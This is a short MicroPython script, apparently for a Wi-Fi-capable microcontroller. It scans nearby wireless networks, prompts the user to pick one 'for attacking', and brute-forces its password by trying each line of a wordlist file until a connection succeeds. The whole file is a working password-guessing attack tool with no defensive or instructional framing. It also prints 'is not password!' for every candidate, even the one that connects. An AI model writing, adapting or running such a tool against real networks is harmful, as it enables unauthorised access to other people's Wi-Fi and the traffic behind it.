import time
import network
import binascii
import sys


sta_if = network.WLAN(network.STA_IF)
print('network config:', sta_if.ifconfig())
sta_if.active(False)

def Choose_WLAN():
    i = 0
    WLAN_list = []
    sta_if.active(True)
    active_wlan = sta_if.scan()

    print('\t SSID \t', end='|')
    print('\t\t MAC \t\t', end='|')
    print('\t DB \t', end='|')
    print('\t Protect\t', end='|')
    print('  Number\t|')

    for WLAN in active_wlan:
        i += 1
        if len(WLAN[0].decode('utf-8')) <= 10:
            print(WLAN[0].decode('utf-8') + '\t\t', end = '|')
            WLAN_list.append(WLAN[0].decode('utf-8'))
        else:
            print(WLAN[0].decode('utf-8') + '\t', end = '|')
            WLAN_list.append(WLAN[0].decode('utf-8'))
        print('\t' + str(binascii.hexlify(WLAN[1]).decode('utf-8')) + '\t', end = '|')
        print('\t' + str(WLAN[3]) + '\t', end = '|')
        if WLAN[4] == 0:
            print('\t' + 'open\t', end = '|')
        elif WLAN[4] == 1:
            print('\t' + 'WEP\t', end = '|')
        elif WLAN[4] == 2:
            print('\t' + 'WPA-PSK\t', end = '|')
        elif WLAN[4] == 3:
            print('\t' + 'WPA2-PSK\t', end = '|')
        else:
            print('\t' + 'WPA/WPA2PSK\t', end = '|')
        print('\t' + str(i) + '\t|')
    print()
    WLAN_choose = int(input('Please, choose network for attacking (number) >>> ')) - 1
    return WLAN_list[WLAN_choose]


def do_connect(WLAN):
    if not sta_if.isconnected():
        print('connecting to network...')
        file = open('1.txt', 'r')
        for line in file:
            sta_if.active(True)
            line = line.split('\n')[0].split('\r')[0]
            sta_if.connect(WLAN, str(line))
            ftime = time.time()
            now = 0
            while not sta_if.isconnected() and now < 10:
                now = int(time.time() - ftime)
                pass
            print(line, 'is not password!')
            if sta_if.isconnected():
                print('Password found!', line)
                break
            sta_if.active(False)
    else:
        print('Connecting yet!')
    print('network config:', sta_if.ifconfig())

active_wlan = Choose_WLAN()
do_connect(active_wlan)
sta_if.active(False)

